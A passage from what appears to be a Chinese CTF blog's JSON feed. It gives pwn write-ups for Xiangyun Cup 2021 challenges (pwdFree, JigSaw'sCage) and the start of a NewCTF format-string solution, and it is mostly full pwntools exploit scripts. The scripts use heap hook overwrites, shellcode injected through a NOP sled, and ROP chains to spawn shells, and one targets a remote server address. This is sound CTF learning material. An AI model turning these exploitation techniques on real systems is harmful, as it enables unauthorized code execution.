punctuation\">(</span><span class=\"token string\">'tcache_max_bins'</span><span class=\"token punctuation\">,</span>tcache_max_bins<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x538</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nfd <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nfdn <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fd'</span><span class=\"token punctuation\">,</span>fd<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fdn'</span><span class=\"token punctuation\">,</span>fdn<span class=\"token punctuation\">)</span>\n\nfake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> fd <span class=\"token punctuation\">,</span> fd <span class=\"token punctuation\">,</span> fdn <span class=\"token punctuation\">,</span> tcache_max_bins <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.address'</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x530</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"jigsawscage\"><a class=\"markdownIt-Anchor\" href=\"#jigsawscage\">#</a> JigSaw’sCage</h1>\n<p>说实话，不难，但不知道为啥比赛时没深做</p>\n<p>另外参照了 W&amp;M 战队的方法：<a href=\"https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247487347&amp;idx=3&amp;sn=74341c2480b155981da8081905dac97f&amp;chksm=9760fba5a01772b3ba7bd69d2d71a86c4471f0a611e31daa142304894d90eeeeb2ce5670e840&amp;mpshare=1&amp;scene=23&amp;srcid=0823b7LlkWG06N5TrXGRFt4w&amp;sharer_sharetime=1629698711378&amp;sharer_shareid=a2525076fb7710235921c4462953ffb5#rd\">祥云杯 2021 By W&amp;M（Pwn）部分 (qq.com)</a></p>\n<p>这题就更加明显了，直接可以让你执行长度小于 0x10 的 shellcode，但前提是让堆有执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/8.png\" alt=\"1\"></p>\n<p>在最开始的时候有个洞 v1 只是整形，而可以输入长整形，那么我们可以把下面的随机数也一起控制了</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/image-20210830212630568.png\" alt=\"image-20210830212630568\"></p>\n<p>这样就让堆有了执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1-16303300733865.png\" alt=\"1\"></p>\n<p>话说我看了挺多 wp，发现还是 wjh 师傅的 shellcode 最简单，充分考虑到了执行 shellcode 时各个寄存器的情况</p>\n<p>rax 为 0 刚好可以作为 read 的系统调用号，rdx 为执行的 shellcode 地址，刚好可以作为 read 的写入地址，之后直接读入大段 shellcode 即可</p>\n<p>再贴一下 Aidai 爷的短 shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rsp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">';jmp rsp'</span><span class=\"token punctuation\">)</span></code></pre>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/shellcode.png\" alt=\"执行shellcode寄存器情况\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./JigSAW'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">0</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'iNput:'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'niayh'</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Make your Choice:'</span><span class=\"token punctuation\">,</span>u64<span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 首先通过溢出修改执行权限</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nxor rdi, rdi\nmov rsi, rdx\nmov rdx, 0x1000\nsyscall\n'''</span>\n<span class=\"token comment\"># 这里的 shellcode 因为长度受限，需要充分利用调用时各个寄存器的值</span>\n<span class=\"token comment\"># 程序使用了 call rdx ，这里 rdx 为 heap 段地址，还把 rax 给置 0 </span>\n<span class=\"token comment\"># 我们就可以进行 0 号系统调用 read 读到我们正在执行的 heap 中</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"len\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 系统调用 read 读入 </span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\ntest<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nse<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x90'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 因为程序刚好在执行这段上面这条汇编</span>\n<span class=\"token comment\"># 这样操作刚好属于在执行的过程中把要执行的代码修改了</span>\n<span class=\"token comment\"># wjh 师傅tql，使用 nop 指令滑到 shellcode</span>\n\n<span class=\"token comment\"># 当然也可以多次对小片段 shellcode 来利用</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   JigSAW.py\n@Time    :   2021/08/24 17:58:53\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"还有一道c嘉嘉写的pwn我先学一些再来复现\"><a class=\"markdownIt-Anchor\" href=\"#还有一道c嘉嘉写的pwn我先学一些再来复现\">#</a> 还有一道 C 嘉嘉写的 pwn，我先学一些再来复现</h1>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "堆",
                "IO_FILE",
                "祥云杯"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/NewCTF/",
            "url": "http://niyah.cn/CTF/NewCTF/",
            "title": "NewCTF",
            "date_published": "2021-06-04T14:10:27.000Z",
            "content_html": "<p>调完了，写的 b 脚本把错误 catch 了一直找不到某个铸币错误，导致调了半天</p>\n<a id=\"more\"></a>\n<h1 id=\"qiandao\"><a class=\"markdownIt-Anchor\" href=\"#qiandao\">#</a> qiandao</h1>\n<p>格式化字符串，写的有点太多了，利用格式化字符串在栈上写 ROP 链</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> galatea <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token comment\">#context.log_level = 'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./qiandao'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./qiandao'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"81.68.86.115\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token number\">10001</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\ngadget <span class=\"token operator\">=</span> <span class=\"token number\">0xe6c81</span>\n<span class=\"token comment\">#gdb.attach(p,\"b printf\")</span>\n\n<span class=\"token comment\">#7  __libc_start_main+243</span>\n<span class=\"token 